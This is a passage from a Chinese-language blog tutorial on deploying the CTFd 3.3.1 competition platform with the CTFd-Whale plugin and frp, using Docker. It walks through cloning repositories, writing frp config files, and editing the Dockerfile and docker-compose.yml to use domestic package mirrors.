src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801163328862.png" alt="image-20210801163328862"></p><h3 id="下载CTFd修改版">下载CTFd修改版</h3><p>博主 <a href="https://github.com/ollyhsu">@Oliver</a> 已经对CTFd v3.3.1官方源码进行了更换国内镜像源、添加CTFd-Whale子模块、配置frp网络、设置静态文件CDN加速等工作，可前往使用作者修改的版本进行安装部署。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b frp https://github.com/ollyhsu/CTFd.git<span class="comment"># 修改版（根目录不建议修改名字）</span></span><br><span class="line"><span class="built_in">cd</span> CTFd<span class="comment"># 进入CTFd目录</span></span><br><span class="line">git submodule update --init <span class="comment"># 更新CTFd-Whale子模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ——————————————————————————————————————————————————————</span></span><br><span class="line"><span class="comment"># 如果你访问Github的速度不佳，也可以使用博主提供的CSDN和Gitee版（可选）</span></span><br><span class="line">git <span class="built_in">clone</span> -b https://codechina.csdn.net/ollyhsu/CTFd.git<span class="comment"># CSDN</span></span><br><span class="line"><span class="built_in">cd</span> CTFd<span class="comment"># 进入CTFd目录</span></span><br><span class="line">sed -i <span class="string">&#x27;s/github.com/codechina.csdn.net/g&#x27;</span> .gitmodules<span class="comment"># 修改子模块Url</span></span><br><span class="line">git submodule update --init <span class="comment"># 更新CTFd-Whale子模块</span></span><br><span class="line"><span class="comment"># ——————————————————————————————————————————————————————</span></span><br><span class="line">git <span class="built_in">clone</span> -b frp https://gitee.com/ollyhsu/CTFd.git<span class="comment"># Gitee</span></span><br><span class="line"><span class="built_in">cd</span> CTFd<span class="comment"># 进入CTFd目录</span></span><br><span class="line">sed -i <span class="string">&#x27;s/github.com/gitee.com/g&#x27;</span> .gitmodules<span class="comment"># 修改子模块Url</span></span><br><span class="line">git submodule update --init <span class="comment"># 更新CTFd-Whale子模块</span></span><br></pre></td></tr></table></figure><h3 id="手动配置修改（可选）">手动配置修改（可选）</h3><p>如果你不想使用本人上面修改并集成CTFd-Whale版本，也可以参考下面的步骤进行手动修改~</p><h4 id="下载官方CTFd与CTFd-Whale">下载官方CTFd与CTFd-Whale</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/CTFd/CTFd.git<span class="comment"># 官方Git源码</span></span><br><span class="line"><span class="built_in">cd</span> CTFd/<span class="comment"># 进入CTFd目录</span></span><br><span class="line">git reset --hard 1447d14b6ba5eb35b871aeaea689a0cfed2a4195<span class="comment"># 回滚至3.3.1版</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者从Release页面下载指定版本的CTFd</span></span><br><span class="line">wget -O CTFd.zip https://codeload.github.com/CTFd/CTFd/zip/refs/tags/3.3.1</span><br><span class="line">sudo apt install unzip -y<span class="comment"># 如果无unzip命令请安装</span></span><br><span class="line">unzip CTFd.zip </span><br><span class="line"><span class="built_in">cd</span> CTFd/<span class="comment"># 进入CTFd目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载CTFd-Whale（glzjin师傅的版本不兼容最新版本，这里使用Frank师傅的维护版）</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/frankli0324/ctfd-whale.git CTFd/plugins/ctfd-whale</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801174129374.png" alt="image-20210801174129374"></p><p>大家在这里一定要注意插件放置的路径，插件名称要确保是小写</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801174417670.png" alt="image-20210801174417670"></p><h4 id="配置frp">配置frp</h4><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801180431829.png" alt="image-20210801180431829"></p><p>首先，需要在<code>CTFd目录</code>下创建<code>frp目录</code>用于放置配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> frp</span><br></pre></td></tr></table></figure><p>接下来，使用命令 <code>vim frp/frps.ini</code>在<code>frp</code>目录下添加下面的配置文件，token值要修改成随机值，其他保持默认即可，保存退出。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">6490</span></span><br><span class="line"><span class="attr">token</span> = randomme<span class="comment"># 一定要随机生成</span></span><br><span class="line"><span class="attr">vhost_http_port</span> = <span class="number">8080</span><span class="comment"># HTTP可选</span></span><br><span class="line"><span class="attr">subdomain_host</span> = domain.io<span class="comment"># HTTP可选</span></span><br><span class="line"><span class="attr">custom_404_page</span> = /conf/<span class="number">404</span>.html<span class="comment"># HTTP可选</span></span><br></pre></td></tr></table></figure><p>容器节点自定义域名的请请修改域名</p><p>使用命令 <code>vim frp/frpc.ini</code>在<code>frp</code>目录下添加下面的配置文件，<strong>token值需要与frps.ini的值一样</strong>，其他保持默认即可，保存退出。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">token</span> = randomme<span class="comment"># 要与frps.ini中的值相同</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">172.1</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">6490</span></span><br><span class="line"><span class="attr">pool_count</span> = <span class="number">200</span></span><br><span class="line"><span class="attr">tls_enable</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">admin_addr</span> = <span class="number">172.1</span>.<span class="number">0.3</span></span><br><span class="line"><span class="attr">admin_port</span> = <span class="number">7400</span></span><br></pre></td></tr></table></figure><p>最后我们使用<code>cat</code>命令查看一下配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> frp/frps.ini</span><br><span class="line"><span class="built_in">cat</span> frp/frpc.ini</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210804153303442.png" alt="image-20210804153303442"></p><h4 id="修改Dockerfile">修改Dockerfile</h4><p>由于CTFd默认使用的环境服务器在国外，对于国内用户部署过程非常不友好，因此我们需要使用命令<code>vim Dockerfile</code>修改，添加国内镜像源。此文件一共需要修改三个地方，如图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801180034789.png" alt="image-20210801180034789"></p><p>1、添加容器的默认源，由于原镜像的默认源为Debian，我们将其修改为中科大的源。</p><p>只需要在<code>apt-get update \</code>和<code>RUN</code>之间添加两行命令即可，但一定要注意每行后面的换行符不要丢了~</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801175045937.png" alt="image-20210801175045937"></p><p>修改后：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801175321957.png" alt="image-20210801175321957"></p><p>参考代码如下：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hadolint ignore=DL3008</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list  &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;s|security.debian.org/debian-security|mirrors.ustc.edu.cn/debian-security|g&#x27;</span> /etc/apt/sources.list &amp;&amp; \ </span></span><br><span class="line">    apt-get update \</span><br><span class="line">    &amp;&amp; apt-get install -y --no-install-recommends \</span><br><span class="line">        build-essential \</span><br><span class="line">        default-mysql-client \</span><br><span class="line">        python3-dev \</span><br><span class="line">        libffi-dev \</span><br><span class="line">        libssl-dev \</span><br><span class="line">        git \</span><br><span class="line">    &amp;&amp; apt-get clean \</span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/*</span><br></pre></td></tr></table></figure><p>2、为pip添加阿里云的源，在<code>requirements.txt</code>后加上<code>-i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com</code> ，即可。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801175552699.png" alt="image-20210801175552699"></p><p>修改后</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801175721365.png" alt="image-20210801175721365"></p><p>参考代码：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install -r requirements.txt -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com --no-cache-dir</span></span><br></pre></td></tr></table></figure><p>3、同为修改pip源，参考第二处的方法即可</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801175819479.png" alt="image-20210801175819479"></p><p>修改后</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801175943382.png" alt="image-20210801175943382"></p><p>参考代码：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install -r requirements.txt -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com --no-cache-dir</span></span><br></pre></td></tr></table></figure><p>三处修改完毕，英文输入状态下先按<code>ESC</code>再输入<code>:wq</code>保存退出。</p><p><strong>附：</strong><code>Dockerfile</code>完整配置文件（非CTFd 3.3.1版本的可能不能直接使用下面的完整文件，请手动修改）</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.7</span>-slim-buster</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /opt/CTFd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> -p /opt/CTFd /var/log/CTFd /var/uploads</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hadolint ignore=DL3008</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list  &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;s|security.debian.org/debian-security|mirrors.ustc.edu.cn/debian-security|g&#x27;</span> /etc/apt/sources.list &amp;&amp; \ </span></span><br><span class="line">    apt-get update \</span><br><span class="line">    &amp;&amp; apt-get install -y --no-install-recommends \</span><br><span class="line">        build-essential \</span><br><span class="line">        python3-dev \</span><br><span class="line">        libffi-dev \</span><br><span class="line">        libssl-dev \</span><br><span class="line">        git \</span><br><span class="line">    &amp;&amp; apt-get clean \</span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/*</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> requirements.txt /opt/CTFd/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install -r requirements.txt -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com --no-cache-dir</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /opt/CTFd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hadolint ignore=SC2086</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="keyword">for</span> d <span class="keyword">in</span> CTFd/plugins/*; <span class="keyword">do</span> \</span></span><br><span class="line"><span class="language-bash">        <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$d</span>/requirements.txt&quot;</span> ]; <span class="keyword">then</span> \</span></span><br><span class="line"><span class="language-bash">            pip install -r <span class="variable">$d</span>/requirements.txt -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com --no-cache-dir; \</span></span><br><span class="line"><span class="language-bash">        <span class="keyword">fi</span>; \</span></span><br><span class="line"><span class="language-bash">    <span class="keyword">done</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> adduser \</span></span><br><span class="line"><span class="language-bash">    --disabled-login \</span></span><br><span class="line"><span class="language-bash">    -u 1001 \</span></span><br><span class="line"><span class="language-bash">    --gecos <span class="string">&quot;&quot;</span> \</span></span><br><span class="line"><span class="language-bash">    --shell /bin/bash \</span></span><br><span class="line"><span class="language-bash">    ctfd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /opt/CTFd/docker-entrypoint.sh \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chown</span> -R 1001:1001 /opt/CTFd /var/log/CTFd /var/uploads</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> <span class="number">1001</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8000</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/opt/CTFd/docker-entrypoint.sh&quot;</span>]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="修改docker-compose">修改docker-compose</h4><p>使用下面的命令修改<code>docker-compose.yml</code>配置文件，具体操作请往下看。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim docker-compose.yml </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801180657502.png" alt="image-20210801180657502"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801211924442.png" alt="image-20210801211924442"></p><p>1、在ctfd服务下的<code>volumes</code>的<code>- .:/opt/CTFd:ro</code>添加下面一行，通过它与Docker守护进程进行通信。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">/var/run/docker.sock:/var/run/docker.sock</span></span><br></pre></td></tr></table></figure><p>在networks下的internal下方添加下面的内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">frp:</span></span><br><span class="line">    <span class="attr">ipv4_address:</span> <span class="number">172.1</span><span class="number">.0</span><span class="number">.2</span></span><br></pre></td></tr></table></figure><p>修改后如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801234247032.png" alt="image-20210801234247032"></p><p>2、在<strong>cache下方及networks上方</strong>添加frpc和frps服务，网上有部分教程这个文件中没有加上frps，这会导致最后还要手动配置docker网络，属实麻烦，本文frps这里采用的是host模式的网络连接方式。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801212342839.png" alt="image-20210801212342839"></p><p>修改内容（这里可以直接复制，不需要进行任何修改）：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">frpc:</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">glzjin/frp:latest</span></span><br><span class="line">  <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">./frp:/conf/</span></span><br><span class="line">  <span class="attr">depends_on:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">frps</span></span><br><span class="line">  <span class="attr">entrypoint:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/usr/local/bin/frpc</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/conf/frpc.ini</span></span><br><span class="line">  <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">frp:</span></span><br><span class="line">          <span class="attr">ipv4_address:</span> <span class="number">172.1</span><span class="number">.0</span><span class="number">.3</span></span><br><span class="line">      <span class="attr">frp_containers:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">frps:</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">glzjin/frp:latest</span></span><br><span class="line">  <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">./frp:/conf/</span></span><br><span class="line">  <span class="attr">entrypoint:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/usr/local/bin/frps</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/conf/frps.ini</span></span><br><span class="line">  <span class="attr">network_mode:</span> <span class="string">host</span></span><br></pre></td></tr></table></figure><p>修改后如图所示，一定要注意格式缩进，否则后面会报错。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801212518071.png" alt="image-20210801212518071"></p><p>3、配置网络</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801212634001.png" alt="image-20210801212634001"></p><p>在networks的<code>internal: true</code>下面添加frp的网络配置信息（直接复制即可，不需要修改）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">frp:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br><span class="line">    <span class="attr">ipam:</span></span><br><span class="line">        <span class="attr">config:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">172.1</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line"><span class="attr">frp_containers:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">overlay</span></span><br><span class="line">    <span class="attr">internal:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">ipam:</span></span><br><span class="line">        <span class="attr">config:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">172.2</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br></pre></td></tr></table></figure><p>修改后如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801212805468.png" alt="image-20210801212805468"></p><p>修改完毕记得保存退出。</p><p><strong>附：</strong><code>docker-compose.yml</code>完整配置文件（非CTFd 3.3.1版本的可能不能直接使用下面的完整文件，请手动修改）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">ctfd:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">user:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8000:8000&quot;</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">UPLOAD_FOLDER=/var/uploads</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DATABASE_URL=mysql+pymysql://ctfd:ctfd@db/ctfd</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">REDIS_URL=redis://cache:6379</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">WORKERS=1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">LOG_FOLDER=/var/log/CTFd</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ACCESS_LOG=-</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ERROR_LOG=-</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">REVERSE_PROXY=true</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">.data/CTFd/logs:/var/log/CTFd</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">.data/CTFd/uploads:/var/uploads</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">.:/opt/CTFd:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/run/docker.sock:/var/run/docker.sock</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">        <span class="attr">default:</span></span><br><span class="line">        <span class="attr">internal:</span></span><br><span class="line">        <span class="attr">frp:</span></span><br><span class="line">            <span class="attr">ipv4_address:</span> <span class="number">172.1</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./conf/nginx/http.conf:/etc/nginx/nginx.conf</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">80</span><span class="string">:80</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ctfd</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mariadb:10.4.12</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_ROOT_PASSWORD=ctfd</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_USER=ctfd</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_PASSWORD=ctfd</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_DATABASE=ctfd</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">.data/mysql:/var/lib/mysql</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">        <span class="attr">internal:</span></span><br><span class="line">    <span class="comment"># This command is required to set important mariadb defaults</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">mysqld</span>, <span class="string">--character-set-server=utf8mb4</span>, <span class="string">--collation-server=utf8mb4_unicode_ci</span>, <span class="string">--wait_timeout=28800</span>, <span class="string">--log-warnings=0</span>]</span><br><span class="line"></span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:4</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">.data/redis:/data</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">        <span class="attr">internal:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="attr">frpc:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">glzjin/frp:latest</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./frp:/conf/</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">frps</span></span><br><span class="line">    <span class="attr">entrypoint:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/usr/local/bin/frpc</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/conf/frpc.ini</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">        <span class="attr">frp:</span></span><br><span class="line">            <span class="attr">ipv4_address:</span> <span class="number">172.1</span><span class="number">.0</span><span class="number">.3</span></span><br><span class="line">        <span class="attr">frp_containers:</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">frps:</span></span><br><span class="line">    <span class="attr">image:</span> <span 